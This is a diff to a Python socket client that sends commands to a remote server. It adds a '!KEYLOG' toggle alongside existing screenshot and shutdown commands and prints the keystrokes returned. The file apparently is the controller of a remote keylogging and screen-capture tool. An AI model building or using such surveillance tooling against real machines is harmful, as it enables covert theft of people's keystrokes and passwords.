@@ -9,6 +9,9 @@ FORMAT = 'utf-8'
 DISCONNECT_MSG = "!DISCONNECT"
 SCREENSHOT_MSG = "!SCREENSHOT"
 SHUTDOWN_MSG = "!SHUTDOWN"
+KEYLOG_MSG = "!KEYLOG"
+
+keylog_on = False
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((SERVER, PORT))
@@ -40,9 +43,18 @@ def display_screenshot(image_bytes):
     image = Image.open(image_streamIO)
     image.show()
 
+def receive():
+    msg_len = client.recv(HEADER).decode(FORMAT)
+    if msg_len:
+        msg_len = int(msg_len)
+        msg = client.recv(msg_len).decode(FORMAT)
+        return msg
+    return ""
+
 def start():
     while True:
         msg = input("Enter a message (type '!SCREENSHOT' to request a screenshot or '!DISCONNECT' to quit): ")
+        global keylog_on
         if msg == DISCONNECT_MSG or msg == SHUTDOWN_MSG:
             send(msg)
             break
@@ -50,6 +62,14 @@ def start():
             send(SCREENSHOT_MSG)
             screenshot_data = receive_screenshot()
             display_screenshot(screenshot_data)
+        elif msg == KEYLOG_MSG:
+            if not keylog_on:
+                keylog_on = True
+                send(msg)
+            else:
+                send(msg)
+                keylog_on = False
+                print(f"Keylog: {receive()}")
         else:
             send(msg)
 
